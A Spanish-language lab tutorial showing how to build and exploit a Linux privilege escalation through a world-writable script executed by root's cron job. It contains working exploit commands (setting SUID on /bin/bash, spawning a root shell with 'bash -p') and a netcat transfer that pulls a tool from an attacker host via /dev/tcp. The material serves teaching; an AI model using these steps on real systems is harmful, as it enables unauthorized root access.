# 🔬 Montando un Mini Laboratorio de Escalada de Privilegios

## 🛠️ Configuración Inicial (Como Root)

> [!danger] Advertencia de Seguridad
> Este laboratorio está diseñado solo para fines educativos. Nunca implemente estas configuraciones en sistemas de producción.

### 1. Preparando el Script Vulnerable

```bash
# Creamos un script en /tmp
echo '#!/bin/bash
echo "Hola mundo" >> /tmp/archivo.txt' > /tmp/script.sh

# Configuramos permisos (ejecutable y escribible por otros)
chmod +x /tmp/script.sh
chmod o+w /tmp/script.sh
```

> [!info] Explicación de Permisos
> - `+x` → Hace el script ejecutable
> - `o+w` → Permite a cualquier usuario modificar el contenido del script

### 2. Configurando el Cron Job

```bash
crontab -e
```

Añadimos la siguiente línea al archivo crontab:

```bash
* * * * * /bin/bash /tmp/script.sh
```

> [!note] Desglose de Crontab
> | Campo | Valor | Significado |
> |-------|-------|-------------|
> | Minuto | * | Cada minuto |
> | Hora | * | Cada hora |
> | Día del mes | * | Cada día |
> | Mes | * | Cada mes |
> | Día de la semana | * | Cada día de la semana |

## 👤 Explotación (Como Usuario No Privilegiado)

### 1. Reconocimiento Inicial

Verificamos el contenido del script:

```bash
cat /tmp/script.sh
```

```bash
#!/bin/bash
echo "Hola mundo" >> /tmp/archivo.txt
```

### 2. Monitoreo de Procesos

#### Opción A: Script Personalizado de Monitoreo

Creamos un monitor de procesos simple:

```bash
cat > procmon.sh << 'EOF'
#!/bin/bash
old_procs=$(ps -eo user,command)

while true; do
    new_procs=$(ps -eo user,command)
    diff <(echo "$old_procs") <(echo "$new_procs") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
    old_procs=$new_procs
    sleep 0.1
done
EOF

chmod +x procmon.sh
```

> [!tip] Funcionamiento
> Este script compara continuamente la lista actual de procesos con la anterior, mostrando solo las diferencias, lo que nos permite detectar cuándo se ejecuta nuestro script objetivo.

#### Opción B: Utilizando pspy

[[pspy]] es una herramienta especializada para monitorear procesos sin privilegios de root:

```bash
./pspy64 -pf -i 1000
```

> [!info] Parámetros de pspy
> - `-pf`: Muestra información completa de los procesos
> - `-i 1000`: Intervalo de escaneo de 1000ms (1 segundo)

### 3. Modificación del Script para Escalada de Privilegios

Una vez confirmado que el script se ejecuta como root, lo modificamos:

```bash
cat > /tmp/script.sh << 'EOF'
#!/bin/bash
echo "Hola mundo" >> /tmp/archivo.txt

# Añadir bit SUID a /bin/bash
chmod u+s /bin/bash
EOF
```

> [!warning] Impacto de Seguridad
> El comando `chmod u+s /bin/bash` establece el bit SUID en bash, permitiendo que cualquier usuario lo ejecute con los privilegios del propietario (root).

### 4. Verificando la Explotación

Esperamos un minuto para que el cron ejecute nuestro script modificado, luego:

```bash
ls -la /bin/bash
```

Si vemos algo como `-rwsr-xr-x`, el bit SUID está establecido.

### 5. Obteniendo Shell como Root

```bash
/bin/bash -p
```

> [!success] Resultado Esperado
> El parámetro `-p` mantiene los privilegios efectivos del SUID, resultando en una shell de root.

## 📡 Transferencia de Herramientas

Si necesitas transferir herramientas como pspy a la máquina objetivo, puedes usar [[netcat]]:

### En la máquina atacante:

```bash
nc -nlvp 443 < pspy64
```

### En la máquina víctima:

```bash
cat </dev/tcp/ip_atacante/443 > pspy64
chmod +x pspy64
```

Para más detalles sobre esta técnica, consulta [[Netcat - Transferencia de archivos por TCP]].

---
[[Escalada de Privilegios]]

#hacking #privilege_escalation #cron #suid #linux #lab_setup #red_team